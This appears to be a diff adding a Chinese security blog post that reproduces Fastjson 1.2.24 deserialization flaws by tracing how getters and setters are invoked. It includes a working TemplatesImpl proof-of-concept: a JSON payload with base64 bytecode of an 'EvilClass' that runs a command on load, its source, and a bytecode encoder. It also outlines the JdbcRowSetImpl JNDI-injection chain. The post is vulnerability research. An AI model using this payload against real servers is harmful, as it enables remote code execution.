@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">
+
+  <meta name="description" content="准备文件pom.xml
+12345678910111213141516&amp;lt;project xmlns=&amp;quot;http://maven.apache.org/POM/4.0.0&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-in">
+
+
+<link rel="alternate" href="/atom.xml" title="F4miti0n&#39;s Blog" type="application/atom+xml">
+<meta name="theme-color" content="#">
+<title>Fastjsonの任意get与set - F4miti0n&#39;s Blog</title>
+<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+<link rel="shortcut icon" href="/favicon.png">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<nav class="main-nav">
+	
+	    <a href="/">← Home</a>
+	
+	
+	    <a href="/about/">About</a>
+	
+	    <a href="/archives/">Archives</a>
+	
+	<a class="cta" href="/atom.xml" data-no-instant>Subscribe</a>
+</nav>
+
+<section id="wrapper">
+    <article class="post">
+    <header>
+        
+            <h1>Fastjsonの任意get与set</h1>
+        
+        <h2 class="headline">May 21 2023
+        
+        </h2>
+    </header>
+</article>
+<section id="post-body"><h2 id="准备文件"><a href="#准备文件" class="headerlink" title="准备文件"></a>准备文件</h2><p><code>pom.xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>  </span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>untitled<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Archetype - untitled<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>    </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>     </span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>test.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">user</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="string">&quot;学习&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> JSON.toJSONString(user);  </span><br><span class="line">        <span class="comment">//toJSONString序列化对象的时候,会调用get方法  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);  </span><br><span class="line">        System.out.println(s1);  </span><br><span class="line">        System.out.println(s2);  </span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse</span> <span class="operator">=</span> JSON.parse(s2);  </span><br><span class="line">        System.out.println(parse);  </span><br><span class="line">        System.out.println(parse.getClass().getName());  </span><br><span class="line">        <span class="comment">//普通的parse什么也不调用,默认转成了JSONObject对象  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse1</span> <span class="operator">=</span> JSON.parseObject(s2);  </span><br><span class="line">        System.out.println(parse1);  </span><br><span class="line">        System.out.println(parse1.getClass().getName());  </span><br><span class="line">        <span class="comment">//普通的JSON.parseObjec什么也不调用,默认转成了JSONObject对象  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;-----------------------------------------------------&quot;</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">parse2</span> <span class="operator">=</span> JSON.parseObject(s2,Object.class);  </span><br><span class="line">        System.out.println(parse2);  </span><br><span class="line">        System.out.println(parse2.getClass().getName());  </span><br><span class="line">        <span class="comment">//指定了对象的JSON.parseObject什么也不调用,默认转成了JSONObject对象  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="流程分析の任意set"><a href="#流程分析の任意set" class="headerlink" title="流程分析の任意set"></a>流程分析の任意set</h2><p>在JSON.parse这里下一个断点,跟进去<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522200418.png"></p>
+<p>跳几步parser重载，来到<code>DefaultJSONParser.parse</code>这里,经过一系列条件判断(其实就看text的第一个字符是什么，这里因为是左括号，所以给他判定为了json解析，用的是json解析器)调用了<code>parseObject(object, fieldName)</code>，跟进一下</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522201414.png"></p>
+<p>可以看到，在这个parseObject代码里的最后部分完成了反序列化操作，先得到反序列化器，再执行反序列化，前面会通过一套相当麻烦的流程取到当前正在解析的key的名称，如果他是@type类型的，就去获取这个typename的类对象，作为后续反序列化器的参数进行加载，这里咱们如果想要继续调试，还得接着跟进一下反序列化器(  <code>getDeserializer</code>  ) 这里<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522201653.png"></p>
+<p>经过一堆缓存加载判断，我们来到了<code>createJavaBeanDeserializer</code>这里（可喜可贺），我们接着跟进<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522205056.png"></p>
+<p>我们直接来到了asmEnable判断这里，这里非常的关键，只有当这里的asmEnable为false，我们才能得到一个真正意义上可调试的反序列化器（这里是用户自定义反序列化器），如果不管的话，他就会用asm自己搞一个没法调试的反序列化器（相关代码如下）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, type, propertyNamingStrategy);</span><br><span class="line"><span class="keyword">return</span> asmFactory.createJavaBeanDeserializer(<span class="built_in">this</span>, beanInfo);</span><br></pre></td></tr></table></figure>
+<p>这里是直接在idea里面给asmEnable设值过的，不过其实也有别的办法<br>(比如给要反序列化的对象插一个Map的属性)<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522205310.png"><br>得到一个能用的反序列化器之后,再重新跟进一下<code>DefaultJsonParser</code>里<br><code>return deserializer.deserialze(this, clazz, fieldName)</code>这段代码。<br>我们新的关键点如下图所示,嗯,是一个设置属性值得地方<br>(他会先把所有属性给遍历一遍,然后用反射把每个属性的值给搞出来，赋给object)<br>我们跟进一下<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522210508.png"></p>
+<p>最终结果如下，就在调用的set方法，要注意一下，这个方法不能是个getonly的方法，不然就没办法了(都能set了,怎么可能是个getonly方法)</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522214737.png"></p>
+<p>最后再提一下吧，有关于method的获取都是在那个JavaBeanSerializer类里面搞得，其基本要求如下<br>对Set方法的要求：</p>
+<ul>
+<li>方法名不小于4</li>
+<li>方法不得为静态方法</li>
+<li>方法的返回类型得是void或者是方法本身所属的类</li>
+<li>方法的参数类型有且仅有一个</li>
+<li>方法名称以set开头，且第四个字母为大写</li>
+</ul>
+<p> 对Get方法的要求:</p>
+<ul>
+<li>方法名不小于4</li>
+<li>方法不得为静态方法</li>
+<li>方法名称以get开头，且第四个字母为大写</li>
+<li>方法不能有参数</li>
+<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
+</ul>
+<h4 id="流程分析の任意get"><a href="#流程分析の任意get" class="headerlink" title="流程分析の任意get"></a>流程分析の任意get</h4><p>再去分析一下parseObject这里,我们跟进<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094609.png"></p>
+<p>结果如图,能看出里面已经把parse封装好了(会调用set的罪魁祸首就是你)<br>然后我们试着跟进一下 <code>JSON.toJSON()</code> ,就是这里完成的get调用</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094625.png"></p>
+<p>在最终起作用的toJSON里，会对传入的javaObject进行一系列判断，根据javaObject的类型决定后续的操作，由于这里是用户自定义的<code>java bean</code>对象，最终是来到了下图所示代码区，通过此处的代码，我们成功的把 <code>javaObject</code> 的属性和属性值转化成了一个map，接着跟进</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094938.png"></p>
+<p>道理是一样的，遍历get方法，跟进<code>getPropertyValue</code></p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523100522.png"></p>
+<p>第一行就在获取属性值了，跟进</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523100653.png"></p>
+<p>这里的method默认就是getXXX，然后就直接给调用了。。。</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523101137.png"></p>
+<h2 id="流程分析のTemplate链"><a href="#流程分析のTemplate链" class="headerlink" title="流程分析のTemplate链"></a>流程分析のTemplate链</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>首先前置条件如下:</p>
+<ul>
+<li>fastjson反序列化时需有<code>Feature.SupportNonPublicField</code>参数<ul>
+<li>（Fastjson默认只能反序列化public属性）</li>
+</ul>
+</li>
+<li><code>_bytecodes[]</code>需进行base64编码</li>
+<li><code>_bytecodes[]</code>中加载的类需为<code>AbstractTranslet</code>的子类</li>
+<li><code>_name</code>不为null</li>
+<li><code>_tfactory</code>不为null</li>
+</ul>
+<h3 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a><code>POC</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMRXZpbENsYXNzOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAJZXZpbENsYXNzBwAuAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAIAAkHAC8MADAAMQEACGNhbGMuZXhlDAAyADMBAAlFdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAA8AAAAEAAEAFwABABEAGAACAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAFAAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABkAGgACAAAAAQAbABwAAwAPAAAABAABABcACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAFwAIABgADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="EvilClass"><a href="#EvilClass" class="headerlink" title="EvilClass"></a><code>EvilClass</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="bytecode生成"><a href="#bytecode生成" class="headerlink" title="bytecode生成"></a><code>bytecode生成</code></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;E:\\历史CVE复现\\Java\\Fastjson反序列化\\1.2.24\\untitled\\target\\classes\\EvilClass.class&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);  </span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];  </span><br><span class="line">            <span class="type">int</span> n;  </span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;  </span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);  </span><br><span class="line">            &#125;  </span><br><span class="line">            fis.close();  </span><br><span class="line">            bos.close();  </span><br><span class="line">            buffer = bos.toByteArray();  </span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);  </span><br><span class="line">        System.out.println(value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="审计分析"><a href="#审计分析" class="headerlink" title="审计分析"></a>审计分析</h3><p>前半部分和之前那个userbean的几乎重合,但侧重点有所不同，比如在获得反序列化器那里，这个beanInfo就已经是个关键点了，我们跟进看一看<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150312.png"></p>
+<p>在这里就把get和set给筛进了fieldList里，用不着急等到下一步了。<br>（仔细看了一遍，在后面那个的那个反序列化器里面，又给重新筛了一遍，逻辑都是一样的，麻）</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150529.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523150551.png"></p>
+<p>到这里的时候就会把<code>getoutPrinter</code>筛进fieldList去<br>调用如下:<br>    <img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152033.png"></p>
+<p>调用<code>newTransformer</code><br>    <img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152218.png"></p>
+<p>调用 <code>getTransletInstance()</code><br>    <img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152518.png"></p>
+<p>在<code>loader.defineClass</code>这里加载分批bytescode,这个defineClass相当于是loadclass重写方法,就不跟进了<br>    <img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523152641.png"></p>
+<h2 id="流程分析のJdbcRowSetImpl"><a href="#流程分析のJdbcRowSetImpl" class="headerlink" title="流程分析のJdbcRowSetImpl"></a>流程分析のJdbcRowSetImpl</h2><p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154350.png"></p>
+<p>跟进一下<code>setDataSourceName</code>,这里就是把传进去的值赋给<code>dataSource</code>,结果如下图</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154450.png"></p>
+<p>再跟进一下<code>setAutoCommit</code>方法<br>关键在 connect() 这个函数上<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523154829.png"></p>
+<p>跟进分析分析，还行那另一处ctx.lookup，值就是刚才赋的datasourcename，一眼jndi注入</p>
+<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523160311.png"></p>
+</section>
+    
+        
+        <h2 class="footline">
+            <a href="/tags/Java安全/#Java安全">Java安全</a>
+        </h2>
+    
+
+    <footer id="post-meta" class="clearfix">
+        <a href="/about/">
+        <img class="avatar" src="/images/avatar.png">
